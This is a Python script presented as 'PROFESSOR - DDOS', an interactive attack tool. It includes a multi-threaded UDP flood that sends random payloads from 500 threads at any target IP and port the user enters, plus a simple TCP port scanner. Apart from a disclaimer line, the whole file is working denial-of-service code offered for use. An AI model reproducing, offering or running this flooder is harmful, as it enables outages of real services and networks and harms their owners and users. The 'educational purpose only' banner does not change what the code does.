# -*- coding: utf-8 -*-

import sys
import os
import time
import socket
import random
import threading
from datetime import datetime

# Colors
GREEN = '\033[92m'
RED = '\033[91m'
WHITE = '\033[97m'
YELLOW = '\033[93m'
CYAN = '\033[96m'
RESET = '\033[0m'

def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')

def banner():
    clear_screen()
    print(f"""{CYAN}
╔══════════════════════════════════════════════════════════╗
║                    PROFESSOR - DDOS                       ║
║                  Advanced Attack Tool                     ║
╠══════════════════════════════════════════════════════════╣
║  CODED BY : SourabhProfessor                             ║
║  VERSION  : 2.0                                           ║
║  GITHUB   : github.com/SourabhProfessor                  ║
╚══════════════════════════════════════════════════════════╝
{RESET}""")
    print(f"{RED}[!] WARNING: Educational Purpose Only{RESET}")
    print(f"{RED}[!] Use At Your Own Risk{RESET}\n")

# Global variables
stop_attack = False
sent_packets = 0
packets_lock = threading.Lock()

def udp_flood(target_ip, target_port, duration=None, packet_size=1490):
    global stop_attack, sent_packets
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        # Random payload
        payload = random._urandom(packet_size)
        
        start_time = time.time()
        local_sent = 0
        
        while not stop_attack:
            try:
                # Send to target port
                sock.sendto(payload, (target_ip, target_port))
                local_sent += 1
                
                # Random port rotation
                current_port = random.randint(1, 65535)
                
                with packets_lock:
                    sent_packets += 1
                
                # Check duration
                if duration and (time.time() - start_time) > duration:
                    break
                    
            except socket.error:
                continue
                
    except Exception as e:
        print(f"{RED}Error in thread: {e}{RESET}")
    finally:
        sock.close()

def multi_threaded_attack(ip, port, threads=500, duration=None, packet_size=1490):
    global stop_attack
    
    print(f"{GREEN}[+] Target: {ip}:{port}{RESET}")
    print(f"{GREEN}[+] Threads: {threads}{RESET}")
    print(f"{GREEN}[+] Packet Size: {packet_size} bytes{RESET}")
    if duration:
        print(f"{GREEN}[+] Duration: {duration} seconds{RESET}")
    print(f"{YELLOW}[+] Starting attack...{RESET}\n")
    
    attack_threads = []
    
    # Create and start threads
    for i in range(threads):
        t = threading.Thread(target=udp_flood, args=(ip, port, duration, packet_size))
        t.daemon = True
        t.start()
        attack_threads.append(t)
    
    # Monitor attack
    try:
        start_time = time.time()
        while not stop_attack:
            time.sleep(1)
            with packets_lock:
                pps = sent_packets
                print(f"{GREEN}[{datetime.now().strftime('%H:%M:%S')}] Packets Sent: {pps} | PPS: {pps - (pps - sent_packets)}{RESET}", end='\r')
            
            if duration and (time.time() - start_time) > duration:
                break
                
    except KeyboardInterrupt:
        print(f"\n{YELLOW}[!] Attack stopped by user{RESET}")
    
    stop_attack = True
    
    # Wait for threads to finish
    for t in attack_threads:
        t.join(timeout=1)
    
    print(f"\n{GREEN}[+] Attack finished. Total packets sent: {sent_packets}{RESET}")

def port_scanner(ip, start_port, end_port):
    print(f"{CYAN}[+] Scanning {ip} from port {start_port} to {end_port}{RESET}")
    open_ports = []
    
    for port in range(start_port, end_port + 1):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            result = sock.connect_ex((ip, port))
            if result == 0:
                print(f"{GREEN}[+] Port {port}: OPEN{RESET}")
                open_ports.append(port)
            sock.close()
        except:
            pass
    
    return open_ports

def main():
    banner()
    
    print(f"{WHITE}1. UDP Flood Attack{RESET}")
    print(f"{WHITE}2. Port Scanner{RESET}")
    print(f"{WHITE}3. Exit{RESET}")
    
    choice = input(f"\n{GREEN}Select option: {RESET}")
    
    if choice == '1':
        target_ip = input(f"{GREEN}Target IP: {RESET}")
        target_port = int(input(f"{GREEN}Target Port: {RESET}"))
        
        print(f"\n{YELLOW}Optional Settings:{RESET}")
        threads = int(input(f"{GREEN}Number of threads (default 500): {RESET}") or 500)
        duration = input(f"{GREEN}Duration in seconds (0 for unlimited): {RESET}")
        duration = int(duration) if duration != '0' else None
        packet_size = int(input(f"{GREEN}Packet size in bytes (default 1490): {RESET}") or 1490)
        
        confirm = input(f"\n{RED}[!] Start attack on {target_ip}:{target_port}? (yes/no): {RESET}")
        
        if confirm.lower() == 'yes':
            multi_threaded_attack(target_ip, target_port, threads, duration, packet_size)
        else:
            print(f"{YELLOW}[!] Attack cancelled{RESET}")
            
    elif choice == '2':
        target_ip = input(f"{GREEN}Target IP: {RESET}")
        start_port = int(input(f"{GREEN}Start port: {RESET}"))
        end_port = int(input(f"{GREEN}End port: {RESET}"))
        
        open_ports = port_scanner(target_ip, start_port, end_port)
        print(f"\n{GREEN}[+] Scan complete. Open ports: {open_ports}{RESET}")
        
    elif choice == '3':
        print(f"{YELLOW}[!] Exiting...{RESET}")
        sys.exit(0)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{YELLOW}[!] Exiting...{RESET}")
        sys.exit(0)
    except Exception as e:
        print(f"{RED}[!] Error: {e}{RESET}")
